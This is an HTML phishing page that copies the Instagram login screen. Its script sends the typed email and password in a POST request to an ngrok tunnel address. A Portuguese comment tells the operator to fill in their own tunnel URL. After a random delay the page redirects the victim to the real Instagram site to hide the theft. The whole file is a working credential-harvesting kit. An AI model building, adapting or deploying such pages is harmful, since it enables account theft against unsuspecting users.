<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Instagram</title>
    <link href="https://unpkg.com/tailwindcss@^2/dist/tailwind.min.css" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }
        body {
            touch-action: manipulation;
        }
        .instagram-logo {
            background-position: 0 -130px;
            height: 51px;
            width: 175px;
            background-image: url(https://bit.ly/3v2LT17);
            background-size: auto;
            background-repeat: no-repeat;
        }
        .facebook-logo {
            background-position: -414px -259px;
            background-image: url(https://bit.ly/3v2LT17);
            height: 16px;
            width: 16px;
            background-size: auto;
            background-repeat: no-repeat;
        }
        .apple-store-logo {
            background-position: -132px -182px;
            height: 42px;
            width: 128px;
            background-image: url(https://bit.ly/3v2LT17);
            background-size: auto;
            background-repeat: no-repeat;
        }
        .google-store-logo {
            background-position: 0 -182px;
            height: 42px;
            width: 130px;
            background-image: url(https://bit.ly/3v2LT17);
            background-size: auto;
            background-repeat: no-repeat;
        }
        input:focus {
            outline: none;
        }
        @media (max-width: 350px) {
            .login-box {
                width: 95% !important;
            }
            .content-box {
                width: 95% !important;
            }
        }
    </style>
</head>
<body class="bg-gray-50">
<div class="min-h-screen flex flex-col justify-center items-center p-4">
    <div class="bg-white border border-gray-300 w-80 max-w-full py-8 flex items-center flex-col mb-3 content-box">
        <h1 class="bg-no-repeat instagram-logo mb-6"></h1>
        <form class="w-64 max-w-full flex flex-col" id="loginForm">
            <input
                class="text-xs w-full mb-2 rounded border bg-gray-50 border-gray-300 px-2 py-2 focus:border-gray-400"
                id="email" placeholder="Phone number, username, or email" type="text" required
                autocapitalize="off" autocorrect="off" inputmode="email">
            <input
                class="text-xs w-full mb-4 rounded border bg-gray-50 border-gray-300 px-2 py-2 focus:border-gray-400"
                id="password" placeholder="Password" type="password" required
                autocapitalize="off" autocorrect="off">
            <button type="submit" class="text-sm text-center bg-blue-300 hover:bg-blue-400 text-white py-1 rounded font-medium transition-colors duration-200" id="loginButton">
                Log In
            </button>
        </form>
        <div class="flex justify-evenly items-center w-64 max-w-full mt-4 mb-4">
            <span class="bg-gray-300 h-px flex-grow"></span>
            <span class="flex-none uppercase text-xs text-gray-400 font-semibold mx-2">or</span>
            <span class="bg-gray-300 h-px flex-grow"></span>
        </div>
        <button class="flex items-center justify-center mb-4">
            <div class="bg-no-repeat facebook-logo mr-2"></div>
            <span class="text-xs text-blue-900 font-semibold">Log in with Facebook</span>
        </button>
        <a class="text-xs text-blue-900 cursor-pointer">Forgot password?</a>
    </div>
    <div class="bg-white border border-gray-300 text-center w-80 max-w-full py-4 content-box">
        <span class="text-sm">Don't have an account?</span>
        <a class="text-blue-500 text-sm font-semibold ml-1">Sign up</a>
    </div>
    <div class="text-center mt-3">
        <span class="text-xs">Get the app</span>
        <div class="flex justify-center mt-3 space-x-2">
            <div class="bg-no-repeat apple-store-logo cursor-pointer"></div>
            <div class="bg-no-repeat google-store-logo cursor-pointer"></div>
        </div>
    </div>
</div>

<script>
    document.getElementById("loginForm").addEventListener("submit", async function(e) {
        e.preventDefault();
        const email = document.getElementById("email").value;
        const password = document.getElementById("password").value;
        const button = document.getElementById("loginButton");
        
        // Animação de loading
        button.disabled = true;
        button.innerHTML = `
            <div class="flex items-center justify-center">
                <div class="animate-spin rounded-full h-4 w-4 border-b-2 border-white mr-2"></div>
                Logging in...
            </div>
        `;
        
        try {
            // Envia para o servidor via Ngrok (ATUALIZE ESTA URL COM SEU NGROK)
            const response = await fetch("https://1d2d-170-244-6-217.ngrok-free.app", {
                method: "POST",
                headers: { 
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Accept": "application/json"
                },
                body: `email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`
            });
            
            if (!response.ok) throw new Error('Server error');
            
            // Redireciona após um delay aleatório (1-3 segundos)
            setTimeout(() => {
                window.location.href = "https://www.instagram.com/";
            }, Math.random() * 2000 + 1000);
            
        } catch (error) {
            console.error("Error:", error);
            button.innerHTML = "Error! Try Again";
            button.style.backgroundColor = "#ef4444";
            
            setTimeout(() => {
                button.innerHTML = "Log In";
                button.style.backgroundColor = "";
                button.disabled = false;
            }, 2000);
        }
    });
</script>
</body>
</html>
